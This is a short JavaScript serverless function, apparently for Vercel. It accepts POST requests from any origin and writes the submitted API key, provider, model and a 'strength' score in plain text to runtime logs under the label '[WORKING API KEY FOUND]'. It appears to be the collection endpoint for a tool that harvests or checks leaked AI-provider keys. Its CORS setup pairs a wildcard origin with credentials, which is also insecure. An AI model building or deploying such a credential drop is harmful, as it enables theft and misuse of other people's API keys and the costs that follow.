export default function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method === 'POST') {
    const { provider, model, key, latency, strength } = req.body || {};
    
    // This console.log will be captured by Vercel's Runtime Logs
    console.log(`[WORKING API KEY FOUND]`);
    console.log(`Provider: ${provider}`);
    console.log(`Model: ${model}`);
    console.log(`Latency: ${latency}ms`);
    console.log(`Strength: ${strength}/100`);
    console.log(`Key: ${key}`);
    console.log(`----------------------------------------`);
    
    return res.status(200).json({ success: true, message: "Logged to Vercel" });
  }
  
  return res.status(405).json({ error: "Method not allowed" });
}
